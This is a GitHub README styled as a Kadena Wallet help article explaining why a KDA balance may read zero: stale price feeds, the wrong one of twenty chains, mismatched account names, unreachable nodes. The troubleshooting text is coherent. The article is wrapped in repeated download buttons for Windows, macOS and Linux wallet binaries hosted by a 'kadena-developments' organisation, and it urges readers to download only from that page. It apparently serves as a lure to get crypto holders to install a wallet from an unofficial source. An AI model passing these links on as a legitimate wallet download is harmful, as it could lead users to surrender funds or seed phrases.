![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Why Your KDA Balance Shows Zero, and Where It Really Is</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

A wallet that reports zero is telling you one of four different things, and only one of them is about your funds. A missing price quote, a chain the interface is not showing, a name that was never funded, and a node that cannot reply all look identical on screen. The order of the checks below is deliberate: the cheapest test comes first, and the seed phrase comes last.

## You'll see this if

- The portfolio reads $0.00 while the coin amount looks right, or the amount itself vanished.
- A wallet that showed a balance last week now shows nothing at all.
- You sent KDA to an address and the receiving side still insists it is empty.
- An exchange deposit never arrived, or arrived and later disappeared.

## Four zeros, four causes

| What you see | What it usually means | First test |
| --- | --- | --- |
| Dollar value at zero, amount intact | No usable price quote for the asset | Read the coin amount, ignore the valuation |
| Amount zero on one chain | A different chain is being displayed | Walk chains 0 to 19 |
| Amount zero on every chain | The name is not the one that was funded | Compare strings character by character |
| A spinner or an error instead of figures | The node behind the interface is unreachable | Try an explorer |

Most reports stop at the first row, and the first row costs nothing to confirm.

## An amount and a valuation are unrelated numbers

A wallet shows state and opinion side by side. The amount comes from a chain. The dollar figure comes from a price source that may be stale, absent, or reading a market that no longer exists.

Delisted assets are the worst case for that second number. On 10 November 2026, three public pages carried figures for the same asset that differed by more than sixty times: a Coinbase informational page at $0.49, Crypto.com at $0.01077, CoinLore at $0.0308. A wallet that trusts any single one of them can print a valuation that is nonsense while the amount beside it is exact.

So ask a narrower question. Is there a number of KDA on the screen, and does it match what you expect? If yes, the balance is fine and the price display is the fault. Treat a dollar figure for a thinly traded asset as decoration.

## The chain is a location, and there are twenty of them

Kadena runs twenty braided chains. A name is not one object that lives everywhere; it is separate state on each chain, and the amounts can differ between them.

A wallet opens on exactly one of those twenty. If funds arrived elsewhere, the interface is not wrong, it is answering about the chain it was pointed at.

1. Find the chain selector and note the current chain.
2. Move through the chains one at a time until the amount appears.
3. If there is no selector, paste the address into a community explorer and check each chain there.
4. Record the chain number you found. It is part of where the money lives, and you will need it again.

Nothing is broken when the answer turns out to be chain 12. The deposit simply went where the sender aimed it.

## When every chain comes up empty, suspect the name

If the address is bare on all twenty chains, the question changes from where to which. Three things produce a string that looks valid and controls nothing.

- **A different derivation.** Software can take your phrase and build keys along a scheme of its own, producing a pristine account with no history. Chainweaver derived from its own master seed rather than a standard path, which is why importing those words elsewhere can look like a new wallet.
- **A legacy name.** Names created before the `k:` prefix became the convention are the raw public key. They remain valid, and they are a separate account from the prefixed name derived from the same key. Mining payouts occasionally landed in one by accident.
- **A damaged copy.** A prefixed principal runs to sixty-six characters. A paste that lost the prefix, a character or the tail is a different string, and permissive fields will accept it anyway.

The comparison is mechanical. Put the funded string beside the displayed one and read them character by character. Refreshing, reinstalling and re-importing cannot change that comparison.

## Then the endpoint

An interface that cannot reach a node cannot report anything. The host named in most pre-2025 guides, `api.chainweb.com`, stopped answering, and tools built against it fail in ways that resemble an empty account.

The test is quick: load a community explorer, paste the address, pick a chain, look. If the explorer shows funds, the chain is healthy and the interface's connection is the problem. If the explorer also shows nothing, the question is upstream of both: the name or the chain.

## The five-minute diagnosis

1. Read the coin amount and disregard the currency figure.
2. Note which chain the interface displays.
3. Check the address in an explorer, chain by chain.
4. Compare the address with the one you funded.
5. Confirm the explorer loads at all, which tests the network path.
6. Only then consider re-importing a phrase, and only where you can verify the derivation.

Steps one to five change nothing and touch no keys. That is the point: the phrase is the last resort, never the opening move.

## What a true zero looks like

Real emptiness has a short and historical list of causes.

- The address was never funded, because the send went somewhere else.
- The funds sit on a chain the interface does not display, which is the case above rather than emptiness.
- The destination account was never created, so a transfer that needed a create step halted after the first half.
- The KDA was sent to an address derived from a different phrase altogether, which is a recovery problem.

Note what is missing: a chain losing balances, a wallet deleting coins, an upgrade erasing state. The November 2025 fork replaced governance keys and left accounts untouched, and no migration or claim process has ever existed on this network.

## Prevention, in four habits

- Note the address and the chain together whenever you fund an account.
- Send a small test amount on any new route and confirm it before the rest.
- Keep an explorer bookmark so a display fault is never mistaken for a loss.
- Prefer wallets that show the chain and the amount. One that hides both is asking you to trust its arithmetic.

## FAQ

**Have I lost my KDA if the wallet shows zero?**
Very unlikely. Check the address on an explorer across chains before concluding anything. One interface's zero is not evidence about chain state.

**Why is the dollar value $0.00 when the amount is correct?**
The price source has no usable quote. Amounts come from the chain; valuations come from a feed that can be stale or absent for a delisted asset.

**Can a wallet display a balance that is not there?**
Only briefly. A cached figure can survive a refresh or two, but the chain decides. An explorer settles it.

**Does re-importing the phrase fix a zero balance?**
Only when derivation is the cause. Importing into software that derives differently creates another empty account, and you type the phrase again to get it.

**Why did funds appear on a chain I never picked?**
Because the sender picked it. Exchange withdrawals and mining payouts specify a chain, and the money lands there whether or not your interface is looking.

## Related reading

- Choosing a chain in Kadena Wallet: why balances differ
- Exchange deposit not showing? The chain mismatch behind it
- Legacy accounts and k: addresses: why both still exist
- Ledger not showing KDA? What Kadena Wallet users check first

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Exchange Deposit Not Showing? The Chain Mismatch Behind It](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/exchange-deposit-not-showing-kadena-wallet.md)
- [Kadena Wallet Cannot Reach the Network: What to Check](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-wallet-connection-error-fix.md)
- [What a KDA Transaction Costs, and Why a Send Fails](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-transaction-fees-explained.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
